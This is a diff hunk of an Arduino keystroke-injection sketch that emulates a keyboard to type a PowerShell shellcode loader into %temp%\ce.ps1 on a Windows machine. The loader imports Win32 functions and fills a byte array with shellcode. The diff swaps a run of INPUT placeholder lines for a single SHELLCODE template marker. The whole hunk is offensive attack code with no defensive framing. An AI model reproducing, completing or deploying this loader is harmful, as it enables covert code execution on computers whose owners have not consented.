@@ -32,17 +32,8 @@ void setup(){
   Keyboard.println("echo '@ >> %temp%\\ce.ps1");
   Keyboard.println("echo $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru >> %temp%\\ce.ps1");
   Keyboard.println("echo [Byte[]]$sc = >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT3 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT4 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT5 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT6 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT7 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT8 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT9 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT10 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT11 >> %temp%\\ce.ps1");
-  Keyboard.println("echo INPUT12 >> %temp%\\ce.ps1");
 
+  SHELLCODE
 
   Keyboard.println("echo $size = 0x1000 >> %temp%\\ce.ps1");
   Keyboard.println("echo if ($sc.Length -gt 0x1000) {$size = $sc.Length} >> %temp%\\ce.ps1");
